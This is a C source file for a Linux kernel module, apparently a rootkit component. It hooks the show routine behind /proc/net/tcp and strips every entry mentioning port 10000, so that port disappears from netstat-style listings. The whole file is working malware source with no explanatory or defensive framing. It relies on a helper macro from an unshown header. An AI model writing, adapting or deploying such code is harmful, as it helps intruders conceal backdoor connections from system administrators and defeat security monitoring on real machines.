# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <net/tcp.h> // struct tcp_seq_afinfo.
# endif // CPP

# include "hide_port.h"

# define NEEDLE_LEN  6
# define SECRET_PORT 10000
# define TMPSZ 150
# define NET_ENTRY "/proc/net/tcp"
# define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo



int fake_seq_show(struct seq_file *seq, void *v);
int (*real_seq_show)(struct seq_file *seq, void *v);
int fake_seq_show(struct seq_file *seq, void *v) 
{
    int ret;
    char needle[NEEDLE_LEN];
    snprintf(needle, NEEDLE_LEN, ":%04X", SECRET_PORT);
    ret = real_seq_show(seq, v); 

    if(strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)){
        printk("Hiding port %d using needle %s.\n", \
                SECRET_PORT, needle);
        seq->count -= TMPSZ;
    }   
    return ret;
}


//Module init and exit
static int __init hide_port_init(void)
{
	// in init
	set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, fake_seq_show, real_seq_show);
	return 0;
}

static void __exit hide_port_exit(void)
{
	// in exit
	if(real_seq_show){
		void *dummy;
		set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, real_seq_show, dummy);
	}		
}


module_init(hide_port_init);
module_exit(hide_port_exit);

